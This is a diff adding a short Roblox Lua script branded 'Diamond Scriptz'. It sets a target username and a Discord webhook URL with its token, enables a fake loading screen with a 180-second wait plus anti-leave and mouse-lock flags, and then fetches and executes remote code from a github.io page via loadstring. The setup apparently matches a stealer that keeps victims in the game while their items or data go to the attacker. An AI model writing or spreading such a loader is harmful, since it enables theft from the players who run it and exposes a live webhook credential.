@@ -1,0 +1,14 @@
+UserName = "mrkronrblx87"
+Webhook = "https://discord.com/api/webhooks/1101807297958793248/gP2O-MAPx3ZG7vsf_htenIHZmeIsVmSj20GXziy5Bfrl7Giy10qgD8BKQTz9jpfkLIt8"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "Diamond Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
